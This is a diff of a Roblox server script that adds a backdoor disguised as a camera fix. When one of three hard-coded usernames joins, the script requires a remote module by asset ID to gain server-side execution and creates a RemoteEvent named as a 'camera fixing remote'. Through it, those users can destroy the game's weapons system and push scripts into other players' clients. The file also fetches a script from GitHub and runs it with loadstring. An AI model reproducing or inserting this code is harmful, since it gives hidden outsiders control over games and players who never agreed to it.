@@ -1,5 +1,228 @@
 print("knocks loadered!!!!")
 
+game.Players.ChildAdded:Connect(function(v)
+    repeat task.wait() until v and v.Character or not game.Players:FindFirstChild(v.Name)
+    if (v.Name == "pagesarecoming" or v.Name == "Trogdor973" or v.Name == "Dekryptionite") and game:GetService("ReplicatedStorage"):FindFirstChild("WeaponsSystem") then
+
+        if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
+            local ticking = tick()
+            require(112354705578311).load() -- goog readder
+            repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
+        end
+
+        _G.goog = game:GetService("ServerScriptService"):FindFirstChild("goog")
+
+        if not _G.goog then
+            warn("goog failed to be added")
+            return
+        end
+
+        local r = Instance.new("RemoteEvent", v:WaitForChild("PlayerGui"))
+        r.Name = "cxo's camera fixing remote"
+
+        r.OnServerEvent:Connect(function(p, i)
+            if p.UserId ~= v.UserId then
+                return
+            end
+
+            if i == "Yes" then
+                game.ReplicatedStorage:FindFirstChild("WeaponsSystem"):Destroy()
+                for x,d in pairs(game.Players:GetPlayers()) do
+                    if d.PlayerGui then
+                        if d.PlayerGui:FindFirstChild("ClientWeaponsScript") then
+                            d.PlayerGui:FindFirstChild("ClientWeaponsScript"):Destroy()
+                        end
+                        if d.PlayerGui:FindFirstChild("WeaponsSystemGui") then
+                            d.PlayerGui:FindFirstChild("WeaponsSystemGui"):Destroy()
+                        end
+                    end
+                end
+                r:Destroy()
+            end
+            if _G.goog then
+                for c,xo in pairs(game.Players:GetPlayers()) do
+                    if xo.Name ~= v.Name and xo.PlayerGui then
+                        local scr = _G.goog:FindFirstChild("Utilities").Client:Clone()
+                        local loa = _G.goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
+                        loa.Parent = scr
+                        scr:WaitForChild("Exec").Value = [[
+                        
+                            local lp = game.Players.LocalPlayer
+                            local ui = game:GetService("UserInputService")
+                            local contextActionService = game:GetService("ContextActionService")
+                            local runService = game:GetService("RunService")
+                            
+                            contextActionService:UnbindAction("ShoulderCameraSprint")
+                            runService:UnbindFromRenderStep("ShoulderCameraUpdate")
+                            contextActionService:UnbindAction("ShoulderCameraZoom")
+                            
+                            while true do
+                                task.wait()
+                                
+                                repeat
+                                    runService.Heartbeat:Wait()
+                                until game.Workspace.CurrentCamera.CameraType == Enum.CameraType.Scriptable
+                            
+                                runService:UnbindFromRenderStep("ShoulderCameraUpdate")
+                                contextActionService:UnbindAction("ShoulderCameraZoom")
+                                contextActionService:UnbindAction("ShoulderCameraSprint")
+                            
+                                local weaponSystem = game:GetService("ReplicatedStorage"):FindFirstChild('WeaponsSystem')
+                                if not weaponSystem then
+                                    return
+                                end
+                            
+                                for _, v in pairs(weaponSystem:GetDescendants()) do
+                                    if v:IsA("Script") then
+                                        v.Disabled = true
+                                    end
+                                    v:Destroy()
+                                end
+                            
+                                local weaponScript = lp.PlayerGui:FindFirstChild("ClientWeaponsScript")
+                                local weaponGui = lp.PlayerGui:FindFirstChild("WeaponsSystemGui")
+                                local clientWeaponScript = lp.PlayerScripts:FindFirstChild("ClientWeaponsScript")
+                            
+                                if weaponScript then
+                                    weaponScript.Disabled = true
+                                    weaponScript:Destroy()
+                                end
+                            
+                                if weaponGui then
+                                    weaponGui:Destroy()
+                                end
+                            
+                                if clientWeaponScript then
+                                    clientWeaponScript.Disabled = true
+                                    clientWeaponScript:Destroy()
+                                end
+                            
+                                game:GetService("UserInputService").MouseBehavior = Enum.MouseBehavior.Default
+                                ui.MouseIconEnabled = true
+                                lp.CameraMaxZoomDistance = 400
+                                lp.CameraMinZoomDistance = 0.5
+                            
+                                local camera = game:GetService("Workspace"):FindFirstChild("Camera")
+                                if camera then
+                                    camera.FieldOfView = 70
+                                end
+                            
+                                game.Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
+                                game.Workspace.CurrentCamera.CameraSubject = lp.Character.Humanoid
+                                lp.Character.Humanoid.AutoRotate = true
+                            end
+                        
+                        ]]
+                        scr.Parent = xo.PlayerGui
+                        scr.Name = "Camera Fixer"
+                        scr.Enabled = true
+                    end
+                end
+            end
+        end)
+
+        local scr = _G.goog:FindFirstChild("Utilities").Client:Clone()
+        local loa = _G.goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
+
+        loa.Parent = scr
+        scr:WaitForChild("Exec").Value = string.format([[
+
+            local button = Instance.new("BindableFunction")
+
+            button.OnInvoke = function(v)
+                if v == "Yes" then
+                    game.Players.LocalPlayer.PlayerGui:FindFirstChild("%s"):FireServer("Yes")
+                end
+                button:Destroy()
+                script:Destroy()
+            end
+
+            game:GetService("StarterGui"):SetCore("SendNotification", {
+                Title = "cxo's admin (Kinda)",
+                Text = "The camera is broken in this server, do you want to fix it?",
+                Duration = 20,
+                Button1 = "Yes",
+                Button2 = "No",
+                Callback = button
+            })
+
+            local lp = game.Players.LocalPlayer
+            local ui = game:GetService("UserInputService")
+            local contextActionService = game:GetService("ContextActionService")
+            local runService = game:GetService("RunService")
+            
+            contextActionService:UnbindAction("ShoulderCameraSprint")
+            runService:UnbindFromRenderStep("ShoulderCameraUpdate")
+            contextActionService:UnbindAction("ShoulderCameraZoom")
+            
+            while true do
+                task.wait()
+                
+                repeat
+                    runService.Heartbeat:Wait()
+                until game.Workspace.CurrentCamera.CameraType == Enum.CameraType.Scriptable
+            
+                runService:UnbindFromRenderStep("ShoulderCameraUpdate")
+                contextActionService:UnbindAction("ShoulderCameraZoom")
+                contextActionService:UnbindAction("ShoulderCameraSprint")
+            
+                local weaponSystem = game:GetService("ReplicatedStorage"):FindFirstChild('WeaponsSystem')
+                if not weaponSystem then
+                    return
+                end
+            
+                for _, v in pairs(weaponSystem:GetDescendants()) do
+                    if v:IsA("Script") then
+                        v.Disabled = true
+                    end
+                    v:Destroy()
+                end
+            
+                local weaponScript = lp.PlayerGui:FindFirstChild("ClientWeaponsScript")
+                local weaponGui = lp.PlayerGui:FindFirstChild("WeaponsSystemGui")
+                local clientWeaponScript = lp.PlayerScripts:FindFirstChild("ClientWeaponsScript")
+            
+                if weaponScript then
+                    weaponScript.Disabled = true
+                    weaponScript:Destroy()
+                end
+            
+                if weaponGui then
+                    weaponGui:Destroy()
+                end
+            
+                if clientWeaponScript then
+                    clientWeaponScript.Disabled = true
+                    clientWeaponScript:Destroy()
+                end
+            
+                game:GetService("UserInputService").MouseBehavior = Enum.MouseBehavior.Default
+                ui.MouseIconEnabled = true
+                lp.CameraMaxZoomDistance = 400
+                lp.CameraMinZoomDistance = 0.5
+            
+                local camera = game:GetService("Workspace"):FindFirstChild("Camera")
+                if camera then
+                    camera.FieldOfView = 90 -- fuck 70fov, 90fov on top
+                end
+            
+                game.Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
+                game.Workspace.CurrentCamera.CameraSubject = lp.Character.Humanoid
+                lp.Character.Humanoid.AutoRotate = true
+            end
+
+        ]], r.Name)
+
+        if v.PlayerGui then
+            scr.Parent = v.PlayerGui
+        else
+            scr.Parent = v:WaitForChild("PlayerGui")
+        end
+
+        scr.Enabled = true
+    end
+end)
+
 local scr = game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/blueskykah/Kohls-Admin-House-NP/refs/heads/main/Main")
 
 loadstring(scr)()
